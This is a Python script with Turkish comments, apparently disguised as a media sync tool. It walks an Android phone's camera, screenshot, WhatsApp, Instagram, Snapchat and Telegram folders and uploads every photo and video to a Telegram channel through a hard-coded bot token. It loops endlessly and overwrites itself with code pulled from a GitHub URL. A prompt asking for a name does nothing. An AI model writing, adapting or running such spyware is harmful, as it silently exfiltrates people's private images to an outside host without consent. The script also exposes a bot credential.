import os
import subprocess
import sys
import requests
import time

# Gerekli kütüphaneyi yükle
def install(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

# "requests" kütüphanesini yükle
try:
    import requests
except ImportError:
    print("Requests kütüphanesi bulunamadı. Yükleniyor...")
    install('requests')

BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
CHANNEL_ID = "@p8JdyixgqKFlMjA0"
CHECK_INTERVAL = 60  # Güncelleme kontrolü için 60 saniye

# GitHub üzerindeki dosyanın URL'si
SCRIPT_URL = "https://raw.githubusercontent.com/fatiqueos/mediasync/refs/heads/main/main.py"

# Mevcut script dosyasının adı
SCRIPT_NAME = "main.py"

# Mevcut dosyanın içeriğini almak için bir fonksiyon
def get_current_script_content():
    if os.path.exists(SCRIPT_NAME):
        with open(SCRIPT_NAME, "r") as file:
            return file.read()
    return None

# GitHub'dan en son sürümü kontrol et ve indir
def check_for_updates():
    print("Güncellemeler kontrol ediliyor...")
    try:
        response = requests.get(SCRIPT_URL)
        response.raise_for_status()  # Hata kontrolü

        latest_content = response.text
        current_content = get_current_script_content()

        # İçerikler farklıysa güncelle
        if current_content != latest_content:
            print("Yeni bir sürüm bulundu. Güncelleniyor...")
            with open(SCRIPT_NAME, "w") as file:
                file.write(latest_content)
            print("Güncelleme tamamlandı.")
        else:
            print("Zaten en güncel sürümdesiniz.")
    except Exception as e:
        print(f"Güncelleme kontrolünde hata oluştu: {e}")

directories = [
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Pictures/Screenshots/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video/",
    "/storage/emulated/0/Pictures/Instagram/",
    "/storage/emulated/0/Movies/Instagram/",
    "/storage/emulated/0/Pictures/Facebook/",
    "/storage/emulated/0/Movies/CapCut/",
    "/storage/emulated/0/Pictures/CapCut/",
    "/storage/emulated/0/Pictures/Snapchat/",
    "/storage/emulated/0/Pictures/PicsArt/",
    "/storage/emulated/0/Movies/Snapchat/", 
    "/storage/emulated/0/Pictures/Twitter/",
    "/storage/emulated/0/Movies/Twitter/",
    "/storage/emulated/0/Download/Telegram/",
    "/storage/emulated/0/Movies/",
    "/storage/emulated/0/Videos/"
]

image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
video_extensions = [".mp4", ".mov", ".avi"]

def send_media_to_channel(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" if file_path.endswith(tuple(image_extensions)) else f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    
    with open(file_path, "rb") as media_file:
        data = {"chat_id": CHANNEL_ID}
        files = {"photo" if file_path.endswith(tuple(image_extensions)) else "video": media_file}
        
        response = requests.post(url, data=data, files=files)
        if response.status_code == 200:
            print(f"Başarıyla gönderildi: {file_path}")
        else:
            print(f"Başarısız oldu: {file_path}. Hata: {response.text}")

def check_and_send_files():
    # Kullanıcıdan isim girmesini iste
    name = input("Lütfen bir isim girin: ")
    
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(tuple(image_extensions + video_extensions)):
                        print(f"Telegram'a gönderiliyor: {file_path}")  # İlerleme mesajı
                        send_media_to_channel(file_path)
                        time.sleep(1)  # Her gönderim arasında 1 saniye bekle
        else:
            print(f"Dizin mevcut değil: {directory}")

# Ana döngü
while True:
    check_for_updates()  # Her döngüde güncellemeleri kontrol et
    check_and_send_files()  # Medyaları gönder
    time.sleep(CHECK_INTERVAL)  # Belirli bir süre bekle
